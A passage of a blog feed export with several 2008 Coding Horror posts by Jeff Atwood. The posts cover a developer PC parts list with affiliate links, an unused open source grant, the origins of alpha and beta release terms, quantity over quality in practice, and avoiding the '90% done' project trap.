I'm a <a href="http://www.codinghorror.com/blog/archives/000740.html">big triple monitor guy</a>, so I insist on motherboards that are <b>capable of accepting two video cards</b> -- in other words, they have two x8 or x16 PCI Express card slots suitable for video cards. I also <a href="http://www.codinghorror.com/blog/archives/000665.html">demand quiet from my PC</a>, which means a motherboard with all passive cooling. Beyond that, I don't like to pay a lot for a fancy motherboard. After spending the last five years with motherboards packing scads of features I <i>never</i> end up using (two ethernet ports, anyone?), I've realized there are better ways to invest your money. People tend to respect ASUS as one of the largest and most established Taiwanese OEMs, so it's usually a safe choice. I'd go as far down on price on the motherboard as you can without losing whatever essential features you truly need. Save that money for the other parts.
</p>
<p>
<b><a href="http://www.jdoqocy.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16819115036%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Processors%2B-%2BDesktops-_-Intel-_-19115036&amp;cjsku=N82E16819115036">Intel Core 2 Duo E8500 3.16 GHz CPU</a></b> ($190)<br>
<b><a href="http://www.anrdoezrs.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16819115043%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Processors%2B-%2BDesktops-_-Intel-_-19115043&amp;cjsku=N82E16819115043">Intel Core 2 Quad Q9300 2.5 GHz CPU</a></b> ($270)
</p>
<p>
Ah, the eternal debate: <a href="http://www.codinghorror.com/blog/archives/000942.html">dual versus quad</a>. Despite what Intel's marketing weasels might want you to believe, <b>clock speed still matters very much</b>. Here's an example: SQL Server 2005 queries on my local box, a 3.5 GHz dual core, execute <b>more than twice as fast</b> as on our server, a 1.8 GHz eight core machine. Sadly, very few development environments parallelize well, with the <a href="http://www.codinghorror.com/blog/archives/001103.html">notable exception of C++ compilers</a>. Outside of a few niche activities, such as video encoding and professional 3D rendering, most computing tasks don't scale worth a damn beyond two cores. Yes, it's exciting to see those four graphs in Task Manager (and even I get a little giddy <a href="http://blogs.technet.com/markrussinovich/archive/2008/07/21/3092070.aspx">when I see sixty-four of 'em</a>), but take a look at the <a href="http://www.codinghorror.com/blog/archives/000655.html">cold, hard benchmark data</a> and the contents of your wallet <i>before</i> letting that seductive 4 &gt; 2 math hijack the rational parts of your brain.
</p>
<p>
It's also smart to <b>buy a little below the maximum</b>, with the ultimate goal of upgrading to a whizzy-bang 4 GHz quad core CPU sometime in the future. One of the hidden value propositions in building your own PC is the ability to easily <a href="http://www.codinghorror.com/blog/archives/001102.html">upgrade it later</a>. CPU is one of the most obvious upgrade points where you want to intentionally underbuy a little. Give yourself some room for future upgrades. Until a quad costs the same as a dual at the same clock speed, my vote still goes to the fastest dual core you can afford.
</p>
<p>
<b><a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16820134641%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Memory%2B%28Desktop%2BMemory%29-_-Kingston%2BTechnology-_-20134641&amp;cjsku=N82E16820134641">Kingston 4GB (2 x 2GB) DDR2 800</a> x 2</b> ($156)
</p>
<p>
Memory is awesomely cheap. When it comes to memory, I like to buy a few notches above the cheapest stuff, and Kingston has been a consistently reliable brand for me at that pricing level. There's no reason to bother with anything under 8 GB these days. <b>Don't get hung up on memory speed</b>, though. Quantity is more important than a few extra ticks of speed. But don't take my word for it. As an experiment, <a href="http://www.digit-life.com/articles3/cpu/amd-phenom-x4-9850-ddr2-533-p2.html">Digit-Life cut the speed of memory in half</a>, with a resulting <b>overall average performance loss of merely <i>three percent</i></b>.  By the time your system has to reach outside of the L1, L2, and possibly even L3 cache -- it's already so slow from the system's perspective as to be academic. Memory that is a few extra nanoseconds faster isn't going to make any difference. This is also why I specified the latest and greatest Intel CPUs with larger 6 MB L2 caches. Remember, kids, Caching Is Fundamental!
</p>
<p>
<b><a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16822136260%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Hard%2BDrives-_-Western%2BDigital-_-22136260&amp;cjsku=N82E16822136260">Western Digital VelociRaptor 300 GB 10,000 RPM Hard Drive</a></b> ($290)
</p>
<p>
This is arguably the only indulgence on the list. The Velociraptor is an incredibly expensive drive, but it's also <b>a rocket of a hard drive</b>. I'm a big believer in the importance of disk speed to overall system performance, <i>particularly</i> for software developers. At least <a href="http://weblogs.asp.net/scottgu/archive/2007/11/01/tip-trick-hard-drive-speed-and-visual-studio-performance.aspx">Scott Guthrie backs me up on this one</a>. Trust me, <a href="http://www.codinghorror.com/blog/archives/000800.html">you want a 10,000 RPM boot drive</a>. Buy a slower large drive for your archiving needs. You want two drives, anyway; having two spindles will give you a lot of flexibility and also <a href="http://www.codinghorror.com/blog/archives/000714.html">help your virtual machine performance immensely</a>.
</p>
<p>
This new raptor model is the best of the series. It's much quieter, uses less power, generates less heat, and is by far the fastest -- <i>embarrassingly</i> fast. It's expensive, yes. I won't hold it against you if you decide to disregard this advice and go with a respectably fast, less expensive hard drive. But to me, it's all about putting the money where the most significant bottlenecks are, and considered in that light -- man, this thing is <i>so</i> worth it. As <a href="http://www.storagereview.com/WD3000BLFS.sr?page=0%2C7">Storage Review said</a>, "[its] single-user scores .. blow away those of every other [hdd]".
</p>
<p>
<b><a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16814102747%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Video%2BCards-_-Sapphire%2BTechnology%2BLimited-_-14102747&amp;cjsku=N82E16814102747">Radeon HD 4850 512MB video card</a></b> ($155 after rebate)
</p>
<p>
Even if you're not a gamer, it's hard to ignore the charms of <a href="http://techreport.com/articles.x/14967">this amazing powerhouse of a video card</a>. The brand new ATI 4850 delivers performance on par with the very fastest $500+ video card you can buy for <b>a measly hundred and fifty bucks!</b> Modern operating systems require video grunt, either for windowing effects or high-definition video playback. Beyond that, it's looking more and more like some highly parallizable tasks may move to the GPU. Have you ever <a href="http://www.tomshardware.com/reviews/nvidia-cuda-gpu,1954-12.html">read stuff</a> like <i>"even the slowest GPU implementation was nearly 6 times faster than the best-performing CPU version"</i>? Get used to reading statements like that; I expect you'll be reading a lot more of them in the future as general purpose APIs for GPU programmability become mainstream. That's another reason, as a programmer and not necessarily a gamer, you still want a modern video card. For all this talk of coming 8 and 16 core CPUs, eventually <a href="http://www.codinghorror.com/blog/archives/000823.html">the GPU could be the death of the general purpose CPU</a>.
</p>
<p>
We also want our video card to be efficient. Many don't realize this, but <a href="http://www.codinghorror.com/blog/archives/000662.html">your video card can consume as much power as your CPU</a>. Sometimes even more! The 4850, for all its muscle, is remarkably efficient as well. According to <a href="http://www.anandtech.com/video/showdoc.aspx?i=3340&amp;p=2">a recent AnandTech roundup</a>, it's on par with the most efficient cards of this generation. Pay attention to <a href="http://www.codinghorror.com/blog/archives/000353.html">your idle power consumption</a>, because power consumed means heat produced, which in turn means additional noise and possible instability.
</p>
<p>
<b><a href="http://www.jdoqocy.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16817139001%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Power%2BSupplies-_-Corsair%2BMemory%2B%2BInc.-_-17139001&amp;cjsku=N82E16817139001">Corsair 520HX 520W Power Supply</a></b> ($100 after rebate)
</p>
<p>
The power supply is probably one of the most underrated and misunderstood components of a modern PC. First, because people tend to focus on the "watts" number when <a href="http://www.codinghorror.com/blog/archives/000871.html">the really important number is actually <i>efficiency</i></a> -- a certain percentage of energy that goes into every power supply is turned into waste heat. <b>An efficient power supply will run cooler and more reliably because it uses higher quality parts.</b> People think you need <a href="http://www.imdb.com/title/tt0088763/quotes">1.21 Jigawatts</a> to run a powerful desktop system, but that's <a href="http://www.codinghorror.com/blog/archives/000353.html">just not true</a>. Unless you have a bleeding-edge CPU paired with <i>two</i> high-end top of the line gaming class video cards, trust me -- even 500 watts is overkill.
</p>
<p>
The Corsair model I recommend gets <a href="http://www.silentpcreview.com/article692-page1.html">stellar reviews</a>. It has modular cables and the 80 plus designation, so it's 80% efficient at all input voltages. Note that a quality power supply is <a href="http://www.codinghorror.com/blog/archives/000632.html">not a substitute for a quality UPS or surge protector</a>, but it helps.
</p>
<p>
<b><a href="http://www.jdoqocy.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16835185074%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-CPU%2BCooling-_-Scythe%2BUSA-_-35185074&amp;cjsku=N82E16835185074">Scythe "Ninja" SCNJ-2000 cooler</a></b> ($50) <br>
<b><a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16835185046%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-CPU%2BCooling-_-Scythe%2BUSA-_-35185046&amp;cjsku=N82E16835185046">Scythe "Ninja Mini" SCMNJ-1000 cooler</a></b> ($35)
</p>
<p>
I'll be honest with you. I have a <a href="http://www.codinghorror.com/blog/archives/000707.html">giant heatsink fetish</a>. These giant hunks of aluminum and copper, and the liquid-filled heatpipes that drive them, fascinate me. But there's a more practical reason, as well: if you <a href="http://www.codinghorror.com/blog/archives/000665.html">want a quiet computer</a>, you don't even bother with the stock coolers that are bundled with the CPU. Over the last few years, I keep coming back to Scythe's classic "Ninja" tower cooler, which is available in tall and short varieties. They're so <b>astoundingly efficient</b> that, with adequate case ventilation, they can be run fanless. I even (barely) managed to squeeze the Ninja Mini <a href="http://www.codinghorror.com/blog/archives/001107.html">into my home theater PC build</a>, and it's now mercifully fanless as well. There are plenty of other great tower/heatpipe coolers on the market, but the Ninja is still one of the best, a testament to its pioneering design. The CPU is (usually) the biggest consumer of power in your PC, so it's sensible to invest in a highly efficient aftermarket cooler to keep noise and heat at bay under load.
</p>
<p>
There you have it. More than you ever possibly wanted to know about how an obsessive geek builds a PC -- painstakingly analyzing every single part that goes into it. Now, like Rob, you're probably sorry you asked; <b>who needs all the philosophical digressions, just give us the damn parts list!</b> OK, here it is:
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813131219%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboards%2B-%2BIntel-_-ASUS-_-13131219&amp;cjsku=N82E16813131219">ASUS P5E Intel X38 motherboard</a> ($225)
</li>
<li>
<a href="http://www.jdoqocy.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16819115036%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Processors%2B-%2BDesktops-_-Intel-_-19115036&amp;cjsku=N82E16819115036">Intel Core 2 Duo E8500 3.16 GHz CPU</a> ($190) or <a href="http://www.anrdoezrs.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16819115043%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Processors%2B-%2BDesktops-_-Intel-_-19115043&amp;cjsku=N82E16819115043">Intel Core 2 Quad Q9300 2.5 GHz CPU</a> ($270)
</li>
<li>
<a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16820134641%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Memory%2B%28Desktop%2BMemory%29-_-Kingston%2BTechnology-_-20134641&amp;cjsku=N82E16820134641">Kingston 4GB (2 x 2GB) DDR2 800</a> x 2 ($156)
</li>
<li>
<a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16822136260%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Hard%2BDrives-_-Western%2BDigital-_-22136260&amp;cjsku=N82E16822136260">Western Digital VelociRaptor 300 GB 10,000 RPM Hard Drive</a> ($290)
</li>
<li>
<a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16814102747%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Video%2BCards-_-Sapphire%2BTechnology%2BLimited-_-14102747&amp;cjsku=N82E16814102747">Radeon HD 4850 512MB video card</a> ($155 after rebate)
</li>
<li>
<a href="http://www.jdoqocy.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16817139001%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Power%2BSupplies-_-Corsair%2BMemory%2B%2BInc.-_-17139001&amp;cjsku=N82E16817139001">Corsair 520HX 520W Power Supply</a> ($100 after rebate)
</li>
<li>
<a href="http://www.jdoqocy.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16835185074%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-CPU%2BCooling-_-Scythe%2BUSA-_-35185074&amp;cjsku=N82E16835185074">Scythe "Ninja" SCNJ-2000 cooler</a> ($50) or <a href="http://www.dpbolvw.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16835185046%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-CPU%2BCooling-_-Scythe%2BUSA-_-35185046&amp;cjsku=N82E16835185046">Scythe "Ninja Mini" SCMNJ-1000 cooler</a> ($35)
</li>
</ul>
<p>
The <b>best bang for the buck developer x86 box I can come up with</b>, all for around $1100.
</p>
<p>
I try to avoid posting about hardware <i>too</i> much, but sometimes I can't help myself. I blame Rob. Enjoy your new system, Mr. Conery.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-26T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/understanding-the-hardware/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Is Money Useless to Open Source Projects? ]]></title>
<link>https://blog.codinghorror.com/is-money-useless-to-open-source-projects/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>In April I <a href="https://blog.codinghorror.com/donating-5000-to-net-open-source/">donated $5,000</a> of the ad revenue from this website to an open source .NET project. It was exciting to be able to inject some of the energy from this blog into the <a href="http://reddevnews.com/blogs/weblog.aspx?blog=2407">often-neglected</a> .NET open source ecosystem.</p>
<p>As I mentioned at the time, I used a very hands off approach. While I did have some up-front criteria for the award (open source license, public source control, accepts outside source contributions) it's basically a <b>no-strings grant</b>.</p>
<blockquote>
The real money is being sent via wire transfer to Dario Solera, the <a href="http://www.screwturn.eu/">ScrewTurn Wiki</a> project coordinator. What's Dario going to do with this money? You'll have to ask him. That's not for me to decide. There are no strings attached to this money of any kind. I trust the judgment of a fellow programmer to run their project as they see fit.
</blockquote>
<p>When I said the project could do whatever they saw fit with the money, I meant it. Buy liquor and cigarettes, throw a huge party, play it on the ponies. I'm not kidding. As long as the project team believes it's a valid way to move their project forward, whatever they say goes. It's their project, and their grant.</p>
<p>I hadn't heard anything from Dario, and I was curious, so I followed up with him via email. He sent back this response:</p>
<blockquote>
<p>The grant money is still untouched. It's not easy to use it. Website hosting fees are fully covered by ads and donations, and there are no other direct expenses to cover. I thought it would be cool to launch a small contest with prizes for the best plugins and/or themes, but that is not easy because of some laws we have here in Italy that render the handling of a contest quite complex.</p>
<p>What would you suggest?</p>
</blockquote>
<p>I was crushingly disappointed to find out <b>the $5,000 in grant money has been sitting in the bank for the last four months, totally unused</b>. That's painful to hear, possibly the most painful of all outcomes. Why did we bother doing this if nothing changes?</p>
<p>My friend <a href="http://weblogs.asp.net/jgalloway/">Jon Galloway</a> warned me this might happen. I didn't believe him. But what other conclusion can I draw at this point? He was right:</p>
<blockquote>
<p>Open Source is to Traditional Software as Terror Cells are to Large Standing Armies – if you gave a terrorist group a fighter jet, they wouldn't know what to do with it. Open source teams, and culture, have been developed such that they're almost money-agnostic. <b>Open source projects run on time, not money.</b> So, the way to convert that currency is through bounties and funded internships. Unfortunately, setting those up takes time, and since that's the element that's in short supply, we're back to square one.</p>
</blockquote>
<p>I had hoped that $5,000 grant money would be converted into <i>something</i> that furthered an open source project – perhaps something involving the community and garnering more code contributions. But apparently that's more difficult than anyone realized.</p>
<p>Jon offered these ideas:</p>
<ul>
<li>Can they turn the money over to a company or organization who is familiar with this kind of thing, like the Google Summer of Code, etc.?</li>
<li>Often times, documentation and marketing are in really short supply. Could they just hire a technical writer and / or marketing expert with the $5k?</li>
<li>SourceForge has a donations program in which people can make donations to pay developers. Maybe he can run the money through there?</li>
</ul>
<p>I must admit I'm at a bit of a loss here. <b>Do you have any ideas for how the Screwturn Wiki project can use their $5,000 open source grant effectively?</b> If so, please share them in the comments here, or on the <a href="http://www.screwturn.eu/forum/">ScrewTurn forum</a> – in the <a href="http://www.screwturn.eu/forum/viewforum.php?f=8">Suggestions and Feature Requests</a> area.</p>
<p>Even I'm not naive enough to suggest that money can solve every open source software problem. But I don't have a lot of time to contribute; I only have advertising revenue. I'm absolutely dumbfounded to learn that <b>contributing money isn't an effective way to advance an open source project</b>. Surely money <i>can't</i> be totally useless to open source projects… can it?</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-28T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/is-money-useless-to-open-source-projects/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Alpha, Beta, and Sometimes Gamma ]]></title>
<link>https://blog.codinghorror.com/alpha-beta-and-sometimes-gamma/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As we begin the private beta for Stack Overflow later this week, I wondered: where do the software terms <b>alpha</b> and beta come from? And why don't we ever use <b>gamma</b>?
</p>
<p>
</p>
<table>
<tr>
<td valign="middle">
<img alt="image placeholder" >
</td>
<td valign="middle">
<img alt="image placeholder" >
</td>
</tr>
</table>
<p>
Alpha and Beta are the first two characters of the <a href="http://en.wikipedia.org/wiki/Greek_alphabet">Greek alphabet</a>. Presumably these characters were chosen because they refer to the first and second rounds of software testing, respectively.
</p>
<p>
But where did these terms originate? There's an <a href="http://en.wikipedia.org/wiki/Software_release_life_cycle#Origin_of_.27alpha.27_and_.27beta.27">uncited Wikipedia section</a> that claims the alpha and beta monikers came, as did so many other things, from <b>the golden days of IBM</b>:
</p>
<p>
</p>
<blockquote>
The term beta test comes from an <a href="http://en.wikipedia.org/wiki/IBM_Product_Test">IBM hardware product test</a> convention, dating back to punched card tabulating and sorting machines. Hardware first went through an alpha test for preliminary functionality and small scale manufacturing feasibility. Then came a beta test, by people or groups other than the developers, to verify that the hardware correctly performed the functions it was supposed to, and that it could be manufactured at scales necessary for the market. And finally, a c test to verify final safety. With the advent of programmable computers and the first shareable software programs, IBM used the same terminology for testing software. As other companies began developing software for their own use, and for distribution to others, the terminology stuck -- and is now part of our common vocabulary.
</blockquote>
<p>
Based on the <a href="http://en.wikipedia.org/wiki/Software_release_life_cycle">software release lifecycle</a> page, and my personal experience, here's how I'd characterize each phase of software development:
</p>
<p>
</p>
<ol>
<li>
<b>Pre-Alpha</b><br>
<p>
The software is still under active development and not feature complete or ready for consumption by anyone other than software developers. There may be <b>milestones</b> during the pre-alpha which deliver specific sets of functionality, and <b>nightly builds</b> for other developers or users who are comfortable living on the absolute bleeding edge.
</p>
<p>
</p>
</li>
<li>
<b>Alpha</b><br>
<p>
The software is complete enough for <i>internal</i> testing. This is typically done by people other than the software engineers who wrote it, but still within the same organization or community that developed the software.
</p>
<p>
</p>
</li>
<li>
<b>Beta</b><br>
<p>
The software is complete enough for <i>external</i> testing -- that is, by groups outside the organization or community that developed the software. Beta software is usually feature complete, but may have known limitations or bugs. Betas are either closed (private) and limited to a specific set of users, or they can be open to the general public.
</p>
<p>
</p>
</li>
<li>
<b>Release Candidate</b> (aka gamma or delta)<br>
<p>
The software is almost ready for final release. No feature development or enhancement of the software is undertaken; tightly scoped bug fixes are the only code you're allowed to write in this phase, and even then <i>only</i> for the most heinous and debilitating of bugs. One of the <a href="http://weblogs.asp.net/swarren/">most experienced</a> software developers I ever worked with characterized the release candidate development phase thusly: "does this bug kill small children?"
</p>
<p>
</p>
</li>
<li>
<b>Gold</b><br>
<p>
The software is finished -- and by finished, we mean there are no show-stopping, little-children-killing bugs in it. <i>That we know of</i>. There are probably numerous lower-prority bugs <a href="http://www.codinghorror.com/blog/archives/000498.html">triaged into</a> the next point release or service pack, as well.
</p>
<p>
</p>
</li>
</ol>
<p>
These phases all sound perfectly familiar to me, although there are two clear trends:
</p>
<ul>
<li>The definition of beta grows more all-encompassing and elastic every year.
</li>
<li>We are awfully eager to throw alpha quality code over the wall to external users and testers.
</li>
</ul>
<p>
In the brave new world of web 2.0, <b>the alpha and beta designations don't mean quite the same things they used to</b>. Perhaps the most troubling trend is the <a href="http://www.oreillynet.com/pub/a/oreilly/tim/news/2005/09/30/what-is-web-20.html?page=4">perpetual beta</a>. So many websites stay in perpetual beta, it's almost become a running joke. GMail, for example, <a href="http://www.esquire.com/the-side/opinion/gmail-061307">is <i>still</i> in beta after over four years!</a>
</p>
<p>
Although I've seen plenty of release candidates in my day, I've rarely seen a "gamma" or "delta". Apparently Flickr used it for a while in their logo, after heroically soldiering on from beta:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
"loves you" is certainly more fun than "gold", but I'm not sure it's ever the same as <i>done</i>. Maybe that's the way it should be.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-30T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/alpha-beta-and-sometimes-gamma/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Quantity Always Trumps Quality ]]></title>
<link>https://blog.codinghorror.com/quantity-always-trumps-quality/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
<a href="http://nathanbowers.com/">Nathan Bowers</a> pointed me to this <a href="http://www.kk.org/cooltools/archives/000216.php">five year old Cool Tools entry</a> on the book <a href="http://www.amazon.com/dp/0961454733/?tag=codihorr-20">Art &amp; Fear</a>.
</p>
<p>
<a href="http://www.amazon.com/dp/0961454733/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
Although I am not at all ready to call software development "art" -- perhaps "craft" would be more appropriate, or "engineering" if you're feeling generous -- the parallels between some of the advice offered here and my experience writing software are profound.
</p>
<p>
</p>
<blockquote>
The ceramics teacher announced on opening day that he was dividing the class into two groups. All those on the left side of the studio, he said, would be graded solely on the quantity of work they produced, all those on the right solely on its quality. His procedure was simple: on the final day of class he would bring in his bathroom scales and weigh the work of the "quantity" group: fifty pound of pots rated an "A", forty pounds a "B", and so on. Those being graded on "quality", however, needed to produce only one pot - albeit a perfect one - to get an "A".
<p>
Well, came grading time and a curious fact emerged: <b>the works of highest quality were all produced by the group being graded for quantity</b>. It seems that while the "quantity" group was busily churning out piles of work - and learning from their mistakes - the "quality" group had sat theorizing about perfection, and in the end had little more to show for their efforts than grandiose theories and a pile of dead clay.
</p>
</blockquote>
<p>
Where have I heard this before?
</p>
<p>
</p>
<ol>
<li>
<a href="http://www.codinghorror.com/blog/archives/000165.html">Stop theorizing</a>.
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000684.html">Write lots of software</a>.
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000300.html">Learn from your mistakes</a>.
</li>
</ol>
<p>
Quantity always trumps quality. That's why the one bit of advice I always give aspiring bloggers is to <a href="http://www.codinghorror.com/blog/archives/000983.html">pick a schedule and stick with it</a>. It's the only advice that matters, because until you've mentally committed to doing it over and over, you will not improve. You can't.
</p>
<p>
When it comes to software, the same rule applies. If you aren't building, you aren't learning. Rather than agonizing over whether you're building the right thing, <i>just build it</i>. And if that one doesn't work, <a href="http://www.codinghorror.com/blog/archives/000190.html">keep building</a> until you get one that does.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-08-02T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/quantity-always-trumps-quality/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ On Our Project, We're Always 90% Done ]]></title>
<link>https://blog.codinghorror.com/on-our-project-were-always-90-done/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Although I love <a href="http://www.codinghorror.com/blog/archives/000020.html">reading programming books</a>, I find software project management books to be some of the most mind-numbingly boring reading I've ever attempted. I suppose this means I probably shouldn't be a project manager. The bad news for the <a href="http://blog.stackoverflow.com/">Stack Overflow team</a> is that I effectively am one.
</p>
<p>
That's not to say that all software project management books are crap. Just <i>most</i> of them. One of the few that I've found compelling enough to finish is Johanna Rothman's <a href="http://www.amazon.com/dp/0976694026/?tag=codihorr-20">Behind Closed Doors: Secrets of Great Management</a>. She co-wrote it with Esther Derby.
</p>
<p>
<a href="http://www.amazon.com/dp/0976694026/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
After reading it, you'll realize this is the book they <i>should</i> be handing out to every newly minted software project manager. And you'll be deeply depressed because you don't work with any software project managers who apparently <i>have</i> read it.
</p>
<p>
I originally discovered Johanna when one of her pieces was cited in the original Spolsky <a href="http://www.codinghorror.com/blog/archives/000346.html">Best Software Writing</a> book. Her article on <a href="http://www.poppendieck.com/pdfs/Compensation.pdf">team compensation</a> (pdf) basically blew my mind; it forced me to <b>rethink my entire perspective on <i>being paid to work at a job</i></b>. You should read it. If you have a manager, you should get him or her to read it, too. (<font color="red">Update</font>: this essay is actually by <b>Mary Poppendieck</b>, who is also great. I'm leaving it in the post because it's fantastic reading, even if it's a little off topic.)
</p>
<p>
Since then, I've touched on her work briefly in <a href="http://www.codinghorror.com/blog/archives/000288.html">Schedule Games</a> and <a href="http://www.codinghorror.com/blog/archives/000586.html">You Are Not Your Job</a>. But I'd like to focus on a specific aspect of project management that I'm apparently not very good at. A caller in <a href="http://blog.stackoverflow.com/2008/07/podcast-16/">Podcast #16</a> took me to task for <a href="http://www.codinghorror.com/blog/archives/001101.html">my original Stack Overflow schedule claims</a> way back in late April. What was supposed to be "6 to 8 weeks" became.. well, something more like three months.
</p>
<p>
My problem is that I'm almost pathologically bad about writing things down. Unless I'm writing a blog entry, I suppose. I prefer to keep track of what I'm doing in my head, only anticipating as far ahead as the next item I plan to work on, while proceeding forward as quickly as I can. I think I fell prey, at least a little bit, to <a href="http://www.stevemcconnell.com/rdmistak.htm">this scenario</a>:
</p>
<p>
</p>
<blockquote>
"Look, Mike," Tomas said. "I can hand off my code today and call it 'feature complete', but I've probably got three weeks of cleanup work to do once I hand it off." Mike asked what Tomas meant by "cleanup." "I haven't gotten the company logo to show up on every page, and I haven't gotten the agent's name and phone number to print on the bottom of every page. It's little stuff like that. All of the important stuff works fine. I'm 99-percent done."
</blockquote>
<p>
Do you see the problem here? I know, there are so many it's <a href="http://www.codinghorror.com/blog/archives/000889.html">difficult to know where to begin listing them all</a>, but what's the deepest, most fundamental problem at work here?
</p>
<p>
This software developer <b>does not have a detailed list of all the things he needs to do</b>. Which means, despite adamantly claiming that he is 99 percent done -- he has <i>no idea</i> how long development will take! There's simply no factual basis for any of his schedule claims.
</p>
<p>
It is the job of a good software project manager to recognize the tell-tale symptoms of this classic mistake and address them head on before they derail the project. How? By <s>forcing</s>encouraging developers to <b>create a detailed list of everything they need to do</b>. And then breaking that list down into subitems. And then adding all the subitems they inevitably forgot because they didn't think that far ahead. Once you have all those items on a list, then -- and only then -- you can begin to estimate how long the work will take.
</p>
<p>
Until you've got at least the beginnings of a task list, any concept of scheduling is utter fantasy. A very pleasant fantasy, to be sure, but the real world can be extremely unforgiving to such dreams.
</p>
<p>
Johanna Rothman makes the same point in a recent email newsletter, and offers specific actions you can take to <b>avoid being stuck 90% done</b>:
</p>
<p>
</p>
<blockquote>
<ol>
<li>List everything you need to do to finish the big chunk of work. I include any infrastructure work such as setting up branches in the source control system.
<p>
</p>
</li>
<li>Estimate each item on that list. This initial estimate will help you see how long it might take to complete the entire task.
<p>
</p>
</li>
<li>Now, look to see how long each item on that list will take to finish. If you have a task longer than one day, break that task into smaller pieces. Breaking larger tasks into these inch-pebbles is critical for escaping the 90% Done syndrome.
<p>
</p>
</li>
<li>Determine a way to show visible status to anyone who's interested. If you're the person doing the work, what would you have to do to show your status to your manager? If you're the manager, what do you need to see? You might need to see lists of test cases or a demo or something else that shows you visible progress.
<p>
</p>
</li>
<li>Since you've got one-day or smaller tasks, you can track your progress daily. I like to keep a chart or list of the tasks, my initial estimated end time and the actual end time for each task. This is especially important for you managers, so you can see if the person is being interrupted and therefore is multitasking. (See the article about the <a href="http://www.jrothman.com/pragmaticmanager/refocusing-from-split-focus.html">Split Focus schedule game</a>.)
</li>
</ol>
</blockquote>
<p>
